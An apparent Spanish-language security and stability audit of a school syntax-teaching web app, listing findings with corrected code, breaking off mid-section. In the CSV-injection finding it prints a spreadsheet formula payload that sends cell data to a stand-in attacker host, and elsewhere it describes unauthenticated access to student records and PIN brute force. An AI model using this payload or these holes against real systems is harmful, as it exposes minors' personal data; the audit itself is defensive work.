# Auditoría Técnica — Taller de Sintaxis (agosto 2026)

> **Alcance:** diseño de software y estabilidad técnica. **NO** evalúa la corrección
> didáctica, pedagógica, morfológica ni sintáctica de la app: se asume que la lógica
> de negocio lingüística es correcta.
>
> **Base auditada:** rama `main`, commit `40c6da3` (28-ago-2026). 155 archivos
> versionados: ~30.000 líneas de JS de cliente + ~12.000 de Apps Script.
> Excluido el worktree de `.claude/` (es una copia del repo, no código distinto).

## Cómo usar este documento

Cada hallazgo es **autocontenido**: archivo, líneas, qué falla, por qué importa y el
código de corrección. Para trabajar uno, abre una sesión nueva y pega **solo el bloque
de ese hallazgo** — no hace falta el documento entero ni el contexto de la sesión que
lo generó.

**Al cerrar un hallazgo:** cambia su estado en la tabla de abajo, añade el hash del
commit, y haz `git push`.

---

## Estado

| ID | Hallazgo | Prioridad | Esfuerzo | Modelo | Estado |
|----|----------|-----------|----------|--------|--------|
| C3 | `trackError` sin `try/catch` | 🔴 Crítico | 15 min | Sonnet | ✅ HECHO — `11b4480` |
| A5 | `regenerarMorfologia` sin guarda de clave | 🟠 Advertencia | 5 min | Sonnet | ✅ HECHA |
| C4 | SheetJS desde CDN sin SRI | 🔴 Crítico | 30 min | Sonnet | ⬜ Pendiente |
| C5 | Inyección de fórmulas en CSV | 🔴 Crítico | 30 min | Sonnet | ⬜ Pendiente |
| M5 | Worktree huérfano | 🟡 Mejora | 5 min | Sonnet | ⬜ Pendiente |
| M2 | Código muerto (422 líneas) | 🟡 Mejora | 20 min | Sonnet | ⬜ Pendiente |
| M4 | Museo sin poda | 🟡 Mejora | 10 min | Sonnet | ⬜ Pendiente |
| A3 | Fuga de `AudioContext` en Arcade | 🟠 Advertencia | 30 min | Sonnet | ⬜ Pendiente |
| A7 | Verificador de `SHELL_ASSETS` | 🟠 Advertencia | 30 min | Sonnet | ✅ HECHA |
| M3 | Duplicación (`escCSV`, `_el`, sendBeacon) | 🟡 Mejora | 1 h | Sonnet | ⬜ Pendiente |
| M1 | 77 `console.*` en producción | 🟡 Mejora | 30 min | Sonnet | ✅ HECHA |
| A1 | `getOraciones_` sin caché | 🟠 Advertencia | 1 h | Opus | ⬜ Pendiente |
| A2 | `validatePin_`: O(n) + sin límite de intentos | 🟠 Advertencia | 1 h | Opus | ⬜ Pendiente |
| A4 | Escapado ausente en `sint` (46 `innerHTML`) | 🟠 Advertencia | 1-2 h | Opus | ⬜ Pendiente |
| A6 | Acoplamiento por `window.*` (timers, navegación) | 🟠 Advertencia | 2 h | Opus | ✅ HECHA |
| A8 | Datos lingüísticos dentro de los módulos de UI | 🟠 Advertencia | 1 h | Opus | ⬜ Pendiente |
| C1 | Clave de profesor *fail-open* → datos de menores | 🔴 Crítico | 30 min | Opus | ⏸ AL CIERRE DE EVALUACIÓN |
| C2 | Nota de examen calculada y firmada por el cliente | 🔴 Crítico | 3-4 h | Opus | ⏸ AL CIERRE DE EVALUACIÓN |

**⏸ = no desplegar en mitad de una evaluación.** C1 y C2 tocan acceso y calificación:
van al cierre de evaluación, con aviso previo a los alumnos, igual que el rediseño de
calificación y la ponderación F9.

---

# 🔴 CRÍTICOS

## C1 · La contraseña del profesor falla *abierta*: exposición de datos personales de menores

**Archivos:** `server/Code_v6.gs:162` (`requiereClaveProfesor_`) · `js/core/auth.js:7` · `js/core/constants.js:33`

### Qué falla

```javascript
function requiereClaveProfesor_(params) {
  const guardada = PropertiesService.getScriptProperties().getProperty(PROP_CLAVE_PROFESOR);
  if (!guardada) {
    logToSheet_('WARN', 'auth', 'CLAVE_PROFESOR no configurada: endpoints SIN protección...');
    return null;   // ← DEJA PASAR
  }
  const enviada = String((params && params.clave) || '');
  if (enviada !== guardada) return gasError_('No autorizado...', ERR.NO_AUTORIZADO);
  return null;
}
```

Si la propiedad `CLAVE_PROFESOR` no está fijada en Script Properties, la guarda deja
pasar **todas** las peticiones. El despliegue de Apps Script es público y anónimo, así
que la URL

```
.../exec?action=getResults
```

devuelve la hoja `Alumnos_Resultados` entera — nombre, correo, grupo y nota de cada
alumno — a cualquiera que tenga la URL. Y la URL está en claro en
`js/core/constants.js:33`, que se descarga con la app.

Agravante: `js/core/auth.js:7` deja `'profe123'` como contraseña por defecto del
cliente. Si alguna vez se fijó esa misma cadena en el servidor, la protección es nula.

**Por qué importa:** son datos personales de menores (nombre + correo + calificación)
accesibles sin autenticar, con una consulta de una línea.

### Corrección — `server/Code_v6.gs`

```javascript
function requiereClaveProfesor_(params) {
  const guardada = PropertiesService.getScriptProperties().getProperty(PROP_CLAVE_PROFESOR);

  // FAIL-CLOSED: sin clave configurada, los endpoints de profesor NO responden.
  // Antes esto devolvía null (dejaba pasar) para "no romper el despliegue";
  // el precio era servir Alumnos_Resultados a cualquiera con la URL.
  if (!guardada) {
    logToSheet_('ERROR', 'auth',
      'CLAVE_PROFESOR no configurada: endpoints de profesor BLOQUEADOS. ' +
      'Usa el menú "Fijar clave de profesor".', ERR.NO_AUTORIZADO, '');
    return gasError_('El servidor no tiene configurada la contraseña del profesor. ' +
                     'Fíjala desde el menú de la Hoja.', ERR.NO_AUTORIZADO);
  }

  const enviada = String((params && params.clave) || '');
  // Comparación de tiempo constante (no distingue "casi correcta" por tiempo).
  if (enviada.length !== guardada.length) {
    return gasError_('No autorizado. Revisa la contraseña del profesor.', ERR.NO_AUTORIZADO);
  }
  let diff = 0;
  for (let i = 0; i < guardada.length; i++) diff |= enviada.charCodeAt(i) ^ guardada.charCodeAt(i);
  if (diff !== 0) {
    return gasError_('No autorizado. Revisa la contraseña del profesor.', ERR.NO_AUTORIZADO);
  }
  return null;
}
```

### Corrección — `js/core/auth.js`

```javascript
// Sin valor por defecto: una contraseña "de fábrica" publicada en el código
// del cliente equivale a no tener contraseña. Si no hay nada guardado, el
// panel pedirá al profesor que la teclee y el servidor rechazará la petición.
export function getTeacherPw() {
  return localStorage.getItem(LS_TEACHER_PW) || '';
}
```

### ⚠️ Orden de despliegue obligatorio

1. **Primero** fija la clave con el menú de la Hoja ("Fijar clave de profesor").
2. **Después** pega `Code_v6.gs` y redespliega como **Nueva versión**.

Al revés, el panel del profesor deja de funcionar hasta que la fijes.

---

## C2 · La nota del examen la calcula y la firma el cliente

**Archivos:** `js/modules/sint/index.js:3275-3295` · `server/Code_v6.gs:2690` (`saveResult_`) · `server/Code_v6.gs:908` (`doGet`)

### Qué falla

```javascript
_pendingResult = {
  action:'saveResult', name:G.name||'', email:G.email||'', pin:G.examPin||'',
  score:String(score||0), ...
};
const r = await fetchWithTimeout(apiUrl + '?' + new URLSearchParams(_pendingResult), {}, 12000);
```

La nota viaja como un parámetro más de una URL `GET`, y el servidor la escribe tal cual.
Un alumno con las herramientas del navegador abiertas (o simplemente pegando una URL) puede:

1. Enviarse un 10 sin hacer el examen.
2. Enviarlo **con el correo de un compañero** — el correo es autodeclarado y nada lo
   verifica. `validatePin_` comprueba que ese correo no haya entregado ya con ese PIN,
   así que basta con adelantarse para dejar a otro sin poder entregar.

Es un problema de integridad de la calificación: el cliente es la autoridad sobre la nota.

### Corrección (a) — el servidor recalcula la nota

```javascript
// server/Code_v6.gs — dentro de saveResult_(p), antes de construir la fila
//
// El cliente sigue mandando `score` (compatibilidad con la app ya instalada),
// pero es informativo: la nota que se guarda se recalcula aquí a partir de los
// puntos por bloque, que sí son verificables contra el banco.
function _recalcularNota_(p) {
  const suj = Number(p.sujeto)    || 0;
  const fun = Number(p.funciones) || 0;
  const np  = Number(p.np)        || 0;
  const tot = Number(p.totalOraciones) || 0;
  if (tot <= 0) return 0;
  const maxPorOracion = PESO_SUJETO + PESO_FUNCIONES + PESO_NP; // constantes ya existentes
  const bruto = (suj + fun + np) / (tot * maxPorOracion);
  return Math.round(Math.max(0, Math.min(1, bruto)) * 1000) / 100; // 0..10, 2 decimales
}

const notaCliente  = Number(p.score) || 0;
const notaServidor = _recalcularNota_(p);
if (Math.abs(notaCliente - notaServidor) > 0.05) {
  logToSheet_('WARN', 'saveResult',
    'Nota del cliente (' + notaCliente + ') no cuadra con la recalculada (' +
    notaServidor + ') para ' + (p.email || '?'), ERR.BAD_PARAM, '');
}
// A partir de aquí se usa SIEMPRE notaServidor para la columna Nota.
```

### Corrección (b) — ligar la entrega a un identificador que el alumno no elige

`getExamConfig_` devuelve un `token` de un solo uso (aleatorio, guardado en
`CacheService` junto al correo que lo pidió); `saveResult_` lo exige y lo consume.
No impide todo el fraude, pero rompe el caso trivial de "entrego con el correo de otro".

**Nota honesta:** ninguna app estática puede garantizar esto del todo. Lo que elimina
esta corrección es el ataque de un minuto.

---

## C3 · `trackError` puede tumbar la respuesta a mitad de ejercicio ✅ HECHO (`11b4480`)

**Archivo:** `js/feedback/tracking.js:20-30`

Era la única función del archivo sin `try/catch` alrededor de `JSON.parse` /
`localStorage.setItem`, y se ejecuta **cada vez que un alumno falla**. Con el valor
corrupto (`SyntaxError`) o el almacenamiento lleno (`QuotaExceededError` en Safari
privado), la excepción abortaba el procesado de la respuesta: no se marcaba el error,
no se pintaba el feedback, no avanzaba. En un examen, una nota perdida.

**Resuelto** con `_loadErrorHistory()` / `_saveErrorHistory()` defensivos, aplicados
también en los otros puntos que repetían el mismo `JSON.parse` sin red
(`sint`, `compuestas`, `teacher`).

---

## C4 · Librería externa cargada sin verificación de integridad, en la sesión del profesor

**Archivo:** `js/modules/teacher/index.js:1473-1484` (`_loadSheetJS`)

### Qué falla

```javascript
function _loadSheetJS(){
  if (typeof XLSX !== 'undefined') return Promise.resolve();
  return new Promise((resolve, reject) => {
    const s = document.createElement('script');
    s.src = 'https://cdn.jsdelivr.net/npm/xlsx-js-style@1.2.0/dist/xlsx.bundle.js';
    s.onload = () => resolve();
    s.onerror = () => reject(new Error('No se pudo cargar la librería de Excel desde el CDN.'));
    document.head.appendChild(s);
  });
}
```

Se inyectan ~280 KB de JavaScript de un tercero **sin `integrity` ni `crossorigin`**.
Ese código se ejecuta con todos los permisos de la página, justo en el momento en que
el panel del profesor tiene en memoria las notas y correos de todo el grupo, y la
contraseña del profesor en `localStorage`. Si el paquete de npm se secuestra o el CDN
se compromete, el atacante lo lee todo sin dejar rastro. Es el vector de cadena de
suministro clásico.

Llamada desde `generarInformeProfesor()` (`js/modules/teacher/index.js:1486`).

### Corrección A — SRI (mínima, 10 minutos)

```javascript
function _loadSheetJS(){
  if (typeof XLSX !== 'undefined') return Promise.resolve();
  return new Promise((resolve, reject) => {
    const s = document.createElement('script');
    s.src = 'https://cdn.jsdelivr.net/npm/xlsx-js-style@1.2.0/dist/xlsx.bundle.js';
    // Subresource Integrity: si el archivo del CDN cambia UN SOLO BYTE, el
    // navegador se niega a ejecutarlo. Sin esto, un CDN comprometido lee las
    // notas y correos que el panel tiene en memoria en ese momento.
    s.integrity = 'sha384-PEGAR_AQUI_EL_HASH_REAL';
    s.crossOrigin = 'anonymous';
    s.referrerPolicy = 'no-referrer';
    s.onload  = () => resolve();
    s.onerror = () => reject(new Error(
      'No se pudo cargar la librería de Excel (CDN caído o archivo alterado).'));
    document.head.appendChild(s);
  });
}
```

Para obtener el hash:

```bash
curl -sL https://cdn.jsdelivr.net/npm/xlsx-js-style@1.2.0/dist/xlsx.bundle.js | openssl dgst -sha384 -binary | openssl base64 -A
```

### Corrección B — servirlo desde el propio dominio (preferible)

Descargar el archivo una vez a `vendor/xlsx.bundle.js`, cargarlo desde ahí y añadirlo
a `SHELL_ASSETS` de `sw.js`. Elimina el CDN, elimina la dependencia de red y hace que
el informe del profesor funcione **sin conexión**.

```javascript
function _loadSheetJS(){
  if (typeof XLSX !== 'undefined') return Promise.resolve();
  return new Promise((resolve, reject) => {
    const s = document.createElement('script');
    // Copia local de xlsx-js-style 1.2.0. Antes venía de cdn.jsdelivr.net sin
    // comprobación de integridad, ejecutándose en la sesión del profesor con
    // las notas y correos de todo el grupo en memoria.
    s.src = './vendor/xlsx.bundle.js';
    s.onload  = () => resolve();
    s.onerror = () => reject(new Error('No se pudo cargar la librería de Excel.'));
    document.head.appendChild(s);
  });
}
```

Y en `sw.js`, dentro de `SHELL_ASSETS`: `'./vendor/xlsx.bundle.js',`

---

## C5 · Inyección de fórmulas en los CSV que abre el profesor

**Archivos:** `js/modules/teacher/index.js:892` y `:1170` (`escCSV`, duplicada) · `index.html:178` · `js/modules/sint/index.js:1385`

### Qué falla

```javascript
const escCSV = v => {
  if(v == null) return '';
  const s = String(v).replace(/"/g, '""');
  return `"${s}"`;
};
```

El entrecomillado es correcto como CSV, pero no neutraliza el **arranque de fórmula**.
El campo `Nombre` no tiene validación: `js/modules/sint/index.js:1385` solo comprueba
que no esté vacío, e `index.html:178` no tiene `maxlength`.

Un alumno registrado como

```
=HYPERLINK("https://malo.example/?d="&A2&B2,"Cargando…")
```

consigue que Excel o LibreOffice **ejecuten esa fórmula** cuando el profesor abre el
CSV exportado, con acceso a toda la hoja de notas. Funciona igual con `+`, `-`, `@`,
tabulador y retorno de carro.

### Corrección — extraer a `js/core/escape.js`

```javascript
/* Escapa un valor para CSV neutralizando además el arranque de fórmula.
   Excel y LibreOffice ejecutan cualquier celda que empiece por = + - @ (o
   por tab / CR), así que un nombre de alumno puede convertirse en código que
   se ejecuta en el ordenador del profesor. El prefijo ' la marca como texto
   sin que se vea al abrirla. */
export function escCSV(v) {
  if (v == null) return '""';
  let s = String(v).replace(/\r\n?/g, ' ');
  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
  return '"' + s.replace(/"/g, '""') + '"';
}
```

Borrar las **dos** definiciones locales de `escCSV` en `js/modules/teacher/index.js`
(líneas 892 y 1170) y usar la de core, ya expuesta en `window` por `app.js`.

### Refuerzo en origen — `index.html:178`

```html
<input id="inp-name" class="input" type="text" placeholder="Tu nombre completo"
       autocomplete="name" aria-required="true" maxlength="60">
```

### Refuerzo en origen — `js/modules/sint/index.js:1385`

```javascript
// Nombre: solo letras (con acentos y ñ), espacios, guiones y apóstrofos.
// Sin esto, el campo acepta cualquier cosa y acaba en la Hoja y en el CSV.
const NOMBRE_RE = /^[\p{L}\p{M}\s'’.\-]{2,60}$/u;
if (!name) { ferr('e-name','Escribe tu nombre completo.'); ok = false; }
else if (!NOMBRE_RE.test(name)) {
  ferr('e-name','El nombre solo puede llevar letras, espacios y guiones (máx. 60).');
  ok = false;
}
```

---

# 🟠 ADVERTENCIAS

## A1 · `getOraciones_` sin caché: el cuello de botella del servidor

**Archivo:** `server/Code_v6.gs:991`

### Qué falla

Es el endpoint más caliente (cada alumno, cada inicio de sesión) y el único de los
grandes **sin caché**. En cada llamada lee la hoja entera y, para *cada fila*, ejecuta
`safeParseJSON` + `buildOracionObject`, que tokeniza, prueba hasta cuatro estrategias
de enclíticos y compara con `JSON.stringify`. Después devuelve el banco completo, del
que el cliente usará ocho oraciones.

Con 30 alumnos entrando a la vez son 30 recálculos completos dentro de los límites de
ejecución concurrente de Apps Script. El patrón correcto ya existe en este mismo
archivo: `getTextosMorfologia_` (línea 1328) hace caché → PropertiesService → recálculo.

### Corrección

```javascript
function getOraciones_(mode, subfase) {
  // Caché de 5 min por (modo, subfase). El banco cambia cuando el profesor edita
  // la Hoja, no entre dos alumnos: recalcularlo 30 veces en el mismo minuto es
  // trabajo tirado y es lo que hace lenta la entrada a clase.
  const cacheKey = 'oraciones_' + mode + '_' + (subfase || 'all');
  const cache = CacheService.getScriptCache();
  try {
    const hit = cache.get(cacheKey);
    if (hit) return JSON.parse(hit);
  } catch (e) {}

  const resultado = _computeOraciones_(mode, subfase);  // el cuerpo actual, sin tocar

  try {
    const json = JSON.stringify(resultado);
    if (json.length < 100000) cache.put(cacheKey, json, 300);  // límite de CacheService
  } catch (e) {}
  return resultado;
}

// Llamar desde donde ya se invalida la caché de morfología y tras editar el banco.
function invalidarCacheOraciones_() {
  const modos = ['practice', 'exam'];
  const subs  = ['all', 'solo_np', 'np_sujeto', 'completo', 'profundo'];
  const keys  = [];
  modos.forEach(m => subs.forEach(s => keys.push('oraciones_' + m + '_' + s)));
  try { CacheService.getScriptCache().removeAll(keys); } catch (e) {}
}
```

---

## A2 · `validatePin_`: coste creciente y PIN sin límite de intentos

**Archivo:** `server/Code_v6.gs:1175`

### Qué falla

Dos problemas en la misma función:

1. **Rendimiento.** `results.getDataRange().getValues()` lee y recorre la hoja completa
   de resultados en cada validación — incluido `Detalle_JSON`, que son kilobytes por
   alumno. Hoy son cientos de filas; a final de curso, miles. Es un `O(n)` que empeora
   justo cuando más se usa (todos validan a la vez al empezar el examen).
2. **Seguridad.** El PIN es de 4 dígitos (10.000 combinaciones) y no hay límite de
   intentos. Un script prueba el espacio entero en minutos y empieza el examen antes
   de tiempo.

### Corrección

```javascript
function validatePin_(pin, email) {
  if (!pin) return { valid: false, reason: 'no_pin', message: 'PIN no proporcionado.' };

  // Freno de fuerza bruta: un PIN de 4 dígitos son 10.000 combinaciones.
  // Sin esto, un script las prueba todas en minutos.
  const cache = CacheService.getScriptCache();
  const idIntentos = 'pinfail_' + String(email || 'anon').toLowerCase();
  const fallos = Number(cache.get(idIntentos) || 0);
  if (fallos >= 8) {
    return { valid: false, reason: 'too_many',
             message: 'Demasiados intentos. Espera 5 minutos y avisa al profesor.' };
  }

  const ss     = SpreadsheetApp.getActiveSpreadsheet();
  const config = ss.getSheetByName(SHEET_CONFIG);
  if (!config) return { valid: false, reason: 'no_config', message: 'Hoja Config no encontrada.' };

  const rows = config.getDataRange().getValues();
  let storedPin = '';
  for (const row of rows) {
    if (String(row[0]).trim().toLowerCase() === 'pin') { storedPin = String(row[1]).trim(); break; }
  }
  if (!storedPin) return { valid: false, reason: 'no_pin_set',
                           message: 'No hay PIN configurado. Genéralo en el panel del profesor.' };

  if (String(pin).trim() !== storedPin) {
    cache.put(idIntentos, String(fallos + 1), 300);
    return { valid: false, reason: 'wrong_pin', message: 'PIN incorrecto.' };
  }

  // Dedup: leemos SOLO las dos columnas que hacen falta, no la hoja entera.
  // getDataRange() traía también Detalle_JSON de cada fila (kilobytes por alumno).
  const results = ss.getSheetByName(SHEET_RESULTS);
  if (results && email && results.getLastRow() > 1) {
    const rcol = getColMap_(results);
    const iCorreo = rcol['Correo'], iPin = rcol['PIN'];
    if (iCorreo !== undefined && iPin !== undefined) {
      const n = results.getLastRow() - 1;
      const correos = results.getRange(2, iCorreo + 1, n, 1).getValues();
      const pins    = results.getRange(2, iPin    + 1, n, 1).getValues();
      const em = String(email).trim().toLowerCase();
      for (let i = 0; i < n; i++) {
        if (String(correos[i][0]).trim().toLowerCase() === em &&
            String(pins[i][0]).trim() === storedPin) {
          return { valid: false, reason: 'duplicate',
                   message: 'Ya has realizado este examen con este PIN.' };
        }
      }
    }
  }
  cache.remove(idIntentos);
  return { valid: true };
}
```

---

## A3 · Fuga de `AudioContext` en Arcade

**Archivo:** `js/modules/arcade/index.js:275-327` (`startArcadeMusic` / `stopArcadeMusic`)

### Qué falla

```javascript
function startArcadeMusic(){
  const ctx = window.AudioContext ? new AudioContext() : null;   // ← uno nuevo cada partida
  ...
}
function stopArcadeMusic(){
  clearInterval(_arcMusicNodes.bassInterval);
  _arcMusicNodes.master.disconnect();
  _arcMusicNodes = null;                                          // ← el ctx nunca se cierra
}
```

Chrome limita a ~6 los `AudioContext` vivos por página. Cada partida de Arcade consume
uno y **ninguno se cierra**. A la séptima, `new AudioContext()` lanza, el `try/catch`
se lo traga y la música desaparece sin explicación el resto de la sesión. Mientras
tanto, los seis contextos abandonados mantienen despierto el hilo de audio — en un
iPad, batería.

Además duplica infraestructura: `js/core/audio.js:11` (`_getCtx`) ya mantiene un
contexto único. Arcade debería usar ese.

### Corrección — `js/core/audio.js`

```javascript
/* Accesor del contexto compartido, para módulos que construyen sus propios
   grafos de audio (arcade). Que haya UN solo AudioContext en toda la app no es
   cosmético: los navegadores limitan cuántos puede abrir una página. */
export function getAudioCtx() { return _soundOn ? _getCtx() : null; }
```

### Corrección — `js/modules/arcade/index.js`

```javascript
function startArcadeMusic(){
  if(!isSoundOn() || _arcMusicNodes) return;
  try{
    // Reutilizamos el contexto único de core/audio.js. Antes creábamos uno por
    // partida sin cerrarlo nunca: Chrome corta en ~6 y a partir de ahí la música
    // desaparecía en silencio el resto de la sesión.
    const ctx = getAudioCtx();
    if(!ctx) return;
    if(ctx.state === 'suspended') ctx.resume();
    /* ... resto del cuerpo actual, sin cambios ... */
    _arcMusicNodes = { bassInterval, hatInterval, master, ctx };
  }catch(e){ console.warn('[arcMusic]', e); }
}

function stopArcadeMusic(){
  if(!_arcMusicNodes) return;
  try{
    clearInterval(_arcMusicNodes.bassInterval);
    clearInterval(_arcMusicNodes.hatInterval);
    // Solo desconectamos NUESTRO master: el contexto es compartido y lo siguen
    // usando playSuccess/playError. Cerrarlo dejaría la app muda.
    if(_arcMusicNodes.master) _arcMusicNodes.master.disconnect();
  }catch(e){}
  _arcMusicNodes = null;
}
```

---

## A4 · Texto del banco interpolado en atributos HTML sin escapar

**Archivo:** `js/modules/sint/index.js:2254` y `:2260` (dentro de `renderPhase3`)

### Qué falla

```javascript
aria-label="Hueco para ${words}"
...
div.innerHTML=`<div class="blk-words" title="${words}">${words}</div>${slotHTML}`;
```

`words` sale del banco de oraciones de la Hoja. Una oración con comillas dobles —cita
textual, diálogo, un ejemplo con `"por"`— cierra el atributo antes de tiempo y rompe el
marcado. Es la misma familia que el bug de C.Ag. ya documentado en el skill (`consejo`
con comillas rompiendo un `onclick`), pero en otro sitio y aún sin corregir.

**Contexto que agrava:** `sint/index.js` tiene 46 `innerHTML` y solo 2 llamadas a
`escHtml`. El escapado está sistemáticamente ausente en este módulo, a diferencia de
`compuestas` (124 usos), `fabrica` (60) o `laboratorio` (56). Y como `index.html` tiene
170 manejadores en línea, **no se puede añadir una CSP**: el escapado manual es la
única defensa contra XSS que tiene esta app (ver M6).

### Corrección puntual

```javascript
// escHtml viene de core/escape.js (expuesta en window por app.js). Sin ella, una
// oración del banco con comillas dobles cierra el atributo y rompe el bloque —
// el mismo fallo que el `consejo` de C.Ag. en arcade.
const wordsEsc = escHtml(words);
slotHTML = `<div class="dslot ${isOk?'ds-ok':''}" id="ds${b.id}"
    role="button" tabindex="${isOk?'-1':'0'}" aria-label="Hueco para ${wordsEsc}"
    ...>`;
div.innerHTML = `<div class="blk-words" title="${wordsEsc}">${wordsEsc}</div>${slotHTML}`;
```

### Tarea real

Pasada sistemática por los 46 `innerHTML` de `js/modules/sint/index.js` buscando `${`
con datos procedentes del banco (`o.palabras`, `bloque.solucion`, `consejo`, `words`).
Los que interpolan solo constantes internas o números no necesitan cambio.

---

## A5 · Operaciones de escritura por `GET` (una sin ninguna protección)

**Archivo:** `server/Code_v6.gs:908-950` (`doGet`), línea **946**

### Qué falla

En `doGet` se despachan `saveResult`, `saveArcadeScore`, `createExam`, `createMision`,
`setMisGrupos`, `saveMorphResult` y `regenerarMorfologia`. Un `GET` debe ser de solo
lectura: al no serlo, cualquier cosa que "toque" la URL —el prefetch del navegador, un
escáner de enlaces, el previsualizador de WhatsApp al compartir el enlace— dispara una
escritura.

El caso peor es la línea 946:

```javascript
else if (action === 'regenerarMorfologia')     result = regenerarMorfologia_();
```

**Sin guarda de contraseña**, y es la operación más cara del backend: invalida la caché
y recalcula todos los textos de morfología. Repetida en bucle agota la cuota diaria de
Apps Script y deja la app sin servicio para toda la clase.

### Corrección (5 minutos, cierra el hueco de hoy)

```javascript
// regenerarMorfologia invalida la caché y reprocesa TODOS los textos: es la
// operación más cara del backend. Sin guarda, una petición en bucle agota la
// cuota de Apps Script y deja a toda la clase sin app.
else if (action === 'regenerarMorfologia') {
  const na = requiereClaveProfesor_(params);
  result = na || regenerarMorfologia_();
}
```

### El resto: deuda consciente

Migrar `saveResult` y compañía a `POST` es un cambio mayor: el frontend usa
`sendBeacon`, que en esta app manda la carga por la query string **a propósito** (ver
el comentario de `doPost:2636`, el bug que se tragó meses de analíticas). Recomendación:
dejarlo, documentarlo como deuda asumida, y cerrar solo `regenerarMorfologia`.

---

## A6 · Acoplamiento por `window.*`: cada módulo conoce el estado de los demás ✅ HECHA

**Archivos:** `js/modules/sint/index.js:112` (`cleanAllTimers`) · `js/core/navigation.js:13-28`

### Qué falla

```javascript
function cleanAllTimers(){
  if(typeof G==='object'&&G.timerInterval){...}
  if(typeof ARC==='object'){...}   // estado de arcade
  if(typeof MC==='object'){...}    // estado de maestro
}
```

Dos síntomas del mismo problema:

- `cleanAllTimers` vive en `sint` pero limpia los temporizadores de `arcade` y
  `maestro` — y **no conoce** los de `compuestas` (`CP`), `fabrica` (`FAB`) ni
  `laboratorio` (`LAB`), que llegaron después. Un módulo nuevo se olvida de
  registrarse y su temporizador sobrevive a la navegación.
- `js/core/navigation.js` es un módulo ES que depende de ocho identificadores globales
  declarados en un `<script>` clásico (`currentModule`, `LOGIN_PANELS`, `selectedMode`,
  `setMode`, `buildSubfaseGrid`, `startLoadingTips`, `stopLoadingTips`,
  `addDashboardButton`). Funciona por una particularidad del ámbito léxico global, pero
  `showScreen` llama a `startLoadingTips()` **sin guarda**: si `sint/index.js` no llega
  a cargarse, la navegación entera lanza.

### Corrección — `js/core/timers.js` (archivo nuevo)

```javascript
/* Registro central de limpieza. Cada módulo apunta aquí su propia función de
   parada; navigation.js las llama todas al cambiar de pantalla. Antes esto vivía
   en sint/index.js con una lista escrita a mano (G, ARC, MC): los tres módulos
   posteriores (CP, FAB, LAB) nunca llegaron a entrar en ella. */
const _limpiadores = new Set();

export function registrarLimpieza(fn) {
  if (typeof fn === 'function') _limpiadores.add(fn);
  return () => _limpiadores.delete(fn);
}

export function limpiarTodo() {
  _limpiadores.forEach(fn => {
    try { fn(); } catch (e) { console.warn('[timers] limpiador falló', e); }
  });
}
```

### Corrección — `js/core/navigation.js`

```javascript
import { limpiarTodo } from './timers.js';

export function showScreen(id) {
  limpiarTodo();                       // ningún módulo se queda con un timer vivo
  document.querySelectorAll('.screen').forEach(s => {
    s.style.display = 'none';
    s.classList.remove('active');
  });
  const el = document.getElementById(id) || document.getElementById('screen-' + id);
  if (el) { el.style.display = 'flex'; el.classList.add('active'); }

  // Guardas: si sint/index.js no llegó a cargar, la navegación no debe morir.
  const arranca = (id === 'loading' || id === 'screen-loading');
  try {
    if (arranca && typeof startLoadingTips === 'function') startLoadingTips();
    else if (!arranca && typeof stopLoadingTips === 'function') stopLoadingTips();
  } catch (e) {}

  document.body.style.overflow = '';
}
```

Y en cada módulo, una línea:
`registrarLimpieza(() => { clearInterval(FAB._timer); FAB._timer = null; });`

**Recordar:** añadir `js/core/timers.js` a `SHELL_ASSETS` de `sw.js` y al import de `app.js`.

---

## A7 · `SHELL_ASSETS` mantenida a mano: dos caídas de producción ya documentadas ✅ HECHA

**Archivo:** `sw.js:39-92`

### Qué falla

El propio archivo documenta los dos incidentes (4-7 jul-2026 y 17-ago-2026). Hoy la
lista **está sincronizada** —verificado archivo a archivo—, pero el mecanismo que falló
dos veces sigue intacto: una lista escrita a mano que hay que acordarse de tocar cada
vez que se añade un módulo. Como todo el frontend cuelga del grafo de imports de
`app.js`, un solo módulo ausente tumba el arranque completo, en silencio.

### Corrección — `scripts/check-sw-shell.mjs` (archivo nuevo)

```javascript
// Verifica que SHELL_ASSETS de sw.js cubre todo el JS/CSS versionado.
// Existe porque esta lista se ha desincronizado DOS veces (jul-2026 y ago-2026)
// y en ambas la app dejó de arrancar en frío, sin ningún error visible.
// Uso:  node scripts/check-sw-shell.mjs
import { readFileSync } from 'node:fs';
import { execSync } from 'node:child_process';

const sw = readFileSync('sw.js', 'utf8');
const ini = sw.indexOf('const SHELL_ASSETS');
const lista = sw.slice(ini, sw.indexOf('];', ini));
const declarados = new Set([...lista.matchAll(/'\.\/([^']+)'/g)].map(m => m[1]));

const versionados = execSync('git ls-files js css', { encoding: 'utf8' })
  .split('\n')
  .filter(f => /\.(js|css)$/.test(f) && !f.includes('/_legacy/'));

const faltan = versionados.filter(f => !declarados.has(f));
if (faltan.length) {
  console.error('✗ Faltan en SHELL_ASSETS de sw.js:\n  ' + faltan.join('\n  '));
  process.exit(1);
}
console.log(`✓ SHELL_ASSETS cubre los ${versionados.length} archivos js/css versionados.`);
```

**No es un test automatizado** en el sentido de la regla 5 del `CLAUDE.md` (no prueba
comportamiento pedagógico): es un verificador de consistencia de despliegue. Ejecutarlo
a mano antes de cada `git push` ya evita el fallo.

---

## A8 · Datos lingüísticos incrustados en los módulos de interfaz

**Archivo:** `js/modules/maestro/index.js:342-790` (`MORPH_CASCADES`)

### Qué falla

`js/data/` existe precisamente para esto, pero las tablas más grandes viven dentro de
los módulos que las pintan. `MORPH_CASCADES` son ~450 líneas de datos puros en medio de
un archivo de renderizado de 1.989 líneas.

Consecuencias técnicas: el navegador descarga y evalúa la tabla completa aunque el
alumno no entre en Maestro; para corregir un dato hay que abrir el motor; y `git diff`
mezcla cambios de datos con cambios de lógica.

### Corrección (mecánica, sin riesgo de comportamiento)

1. Mover el bloque tal cual a `js/data/cascadas-morfologia.js` con
   `export const MORPH_CASCADES = {...}`.
2. Importarlo en `js/app.js` (sección "2. Datos pedagógicos").
3. Añadirlo a `SHELL_ASSETS` de `sw.js`.

La separación datos/lógica hace además que un futuro `import()` perezoso sea trivial.

---

# 🟡 MEJORAS

## M1 · 77 `console.*` en producción ✅ HECHA

`sint` (26), `compuestas` (13), `maestro` (10), `arcade` (7), `laboratorio` (5),
`teacher` (4), `chispa` (3), `sw.js` (2), `sintagmas` (2), `fabrica` (2), `pwa` (2),
`app.js` (1).

Algunos son diagnóstico legítimo (el guardián de arranque, los avisos del Service
Worker); la mayoría son restos de depuración. No molestan en un iPad de aula, pero
revelan estructura interna a quien abra la consola.

```javascript
// js/core/log.js (archivo nuevo)
